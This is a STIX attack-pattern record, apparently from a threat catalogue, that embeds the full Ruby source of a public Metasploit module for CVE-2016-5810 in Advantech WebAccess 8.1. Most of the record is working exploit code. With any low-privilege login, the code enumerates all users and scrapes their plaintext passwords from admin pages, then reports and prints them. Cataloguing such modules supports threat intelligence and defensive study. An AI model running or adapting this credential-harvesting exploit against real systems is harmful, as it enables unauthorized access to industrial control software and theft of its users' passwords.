{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--22b65617-a814-48cc-b129-352d78ffe6fa",
    "created": "2024-08-14T16:31:24.846459Z",
    "modified": "2024-08-14T16:31:24.846463Z",
    "name": "\"Advantech WebAccess 8.1 Post Authentication Credential Collector\"",
    "description": " This module allows you to log into Advantech WebAccess 8.1, and collect all of the credentials. Although authentication is required, any level of user permission can exploit this vulnerability.  Note that 8.2 is not suitable for this.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/advantech_webaccess_creds.rb",
            "external_id": "advantech_webaccess_creds.rb"
        },
        {
            "source_name": "h00die",
            "external_id": "#PointedouttheobviousduringaPRreviewforCVE-2017-5154"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-5810"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/pull/7859#issuecomment-274305229"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Advantech WebAccess 8.1 Post Authentication Credential Collector\",\n      'Description'    => %q{\n        This module allows you to log into Advantech WebAccess 8.1, and collect all of the credentials.\n        Although authentication is required, any level of user permission can exploit this vulnerability.\n\n        Note that 8.2 is not suitable for this.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'h00die', # Pointed out the obvious during a PR review for CVE-2017-5154\n          'sinn3r', # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2016-5810'],\n          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/7859#issuecomment-274305229']\n        ],\n      'DisclosureDate' => '2017-01-21'\n    ))\n\n    register_options(\n      [\n        OptString.new('WEBACCESSUSER', [true, 'Username for Advantech WebAccess', 'admin']),\n        OptString.new('WEBACCESSPASS', [false, 'Password for Advantech WebAccess', '']),\n        OptString.new('TARGETURI', [true, 'The base path to Advantech WebAccess', '/']),\n      ])\n  end\n\n  def do_login\n    vprint_status(\"Attempting to login as '#{datastore['WEBACCESSUSER']}:#{datastore['WEBACCESSPASS']}'\")\n\n    uri = normalize_uri(target_uri.path, 'broadweb', 'user', 'signin.asp')\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => uri,\n      'vars_post' => {\n        'page' => '/',\n        'pos'  => '',\n        'username' => datastore['WEBACCESSUSER'],\n        'password' => datastore['WEBACCESSPASS'],\n        'remMe'    => '',\n        'submit1'  => 'Login'\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while trying to login')\n    end\n\n    if res.headers['Location'] && res.headers['Location'] == '/broadweb/bwproj.asp'\n      print_good(\"Logged in as #{datastore['WEBACCESSUSER']}\")\n      report_cred(\n        user: datastore['WEBACCESSUSER'],\n        password: datastore['WEBACCESSPASS'],\n        status: Metasploit::Model::Login::Status::SUCCESSFUL\n      )\n      return res.get_cookies.scan(/(ASPSESSIONID\\w+=\\w+);/).flatten.first || ''\n    end\n\n    print_error(\"Unable to login as '#{datastore['WEBACCESSUSER']}:#{datastore['WEBACCESSPASS']}'\")\n\n    nil\n  end\n\n  def get_user_cred_detail(sid, user)\n    vprint_status(\"Gathering password for user: #{user}\")\n\n    uri = normalize_uri(target_uri.path, 'broadWeb','user', 'upAdminPg.asp')\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri,\n      'cookie' => sid,\n      'vars_get' => {\n        'uname' => user\n      }\n    })\n\n    unless res\n      print_error(\"Unable to gather password for user #{user} due to a connection timeout\")\n      return nil\n    end\n\n    html = res.get_html_document\n    pass_field = html.at('input[@name=\"Password\"]')\n\n    pass_field ? pass_field.attributes['value'].text : nil\n  end\n\n  def get_users_page(sid)\n    vprint_status(\"Checking user page...\")\n\n    uri = normalize_uri(target_uri.path, 'broadWeb', 'user', 'AdminPg.asp')\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri,\n      'cookie' => sid\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while checking AdminPg.asp')\n    end\n\n    html = res.get_html_document\n\n    users = html.search('a').map { |a|\n      Rex::Text.uri_decode(a.attributes['href'].text.scan(/broadWeb\\/user\\/upAdminPg\\.asp\\?uname=(.+)/).flatten.first || '')\n    }.delete_if { |user| user.blank? }\n\n    users\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: 'webaccess',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: opts[:status],\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run\n    cookie = do_login\n    users = get_users_page(cookie)\n\n    users.each do |user|\n      pass = get_user_cred_detail(cookie, user)\n\n      if pass\n        report_cred(\n          user: user,\n          password: pass,\n          status: Metasploit::Model::Login::Status::SUCCESSFUL,\n          proof: 'AdminPg.asp'\n        )\n\n        print_good(\"Found password: #{user}:#{pass}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-01-21"
}